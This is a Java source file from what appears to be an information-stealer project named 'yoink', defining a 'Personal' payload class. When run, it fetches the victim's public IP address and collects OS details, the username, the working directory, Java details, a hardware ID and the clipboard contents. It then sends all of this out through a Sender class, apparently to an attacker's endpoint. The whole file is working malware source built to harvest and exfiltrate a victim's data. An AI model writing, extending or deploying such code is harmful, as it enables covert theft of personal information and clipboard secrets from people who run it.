package me.perry.yoink.payload.impl;

import me.perry.yoink.payload.Payload;
import me.perry.yoink.payload.Sender;
import me.perry.yoink.util.HWIDUtil;
import me.perry.yoink.util.Message;

import java.awt.*;
import java.awt.datatransfer.DataFlavor;
import java.net.URL;
import java.util.Scanner;

public final
class Personal implements Payload {
    @Override
    public
    void execute () throws Exception {
        String ip = new Scanner(new URL("https://checkip.amazonaws.com").openStream() ,"UTF-8").useDelimiter("\\A").next();

        Sender.send(new Message.Builder("Personal")
                .addField("IP" ,ip ,true)
                .addField("OS" ,System.getProperty("os.name") ,true)
                .addField("OS Version" ,System.getProperty("os.version") ,true)
                .addField("OS Architecture" ,System.getProperty("os.arch") ,true)
                .addField("Where Ran" ,System.getProperty("user.dir") ,true)
                .addField("Java Home" ,System.getProperty("java.home") ,true)
                .addField("Java Vendor" ,System.getProperty("java.vendor") ,true)
                .addField("Java Version" ,System.getProperty("java.runtime.version") ,true)
                .addField("Name" ,System.getProperty("user.name") ,true)
                .addField("HWID" ,HWIDUtil.getID() ,true)
                .addField("Clipboard" ,(String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor) ,true)
                .build());
    }
}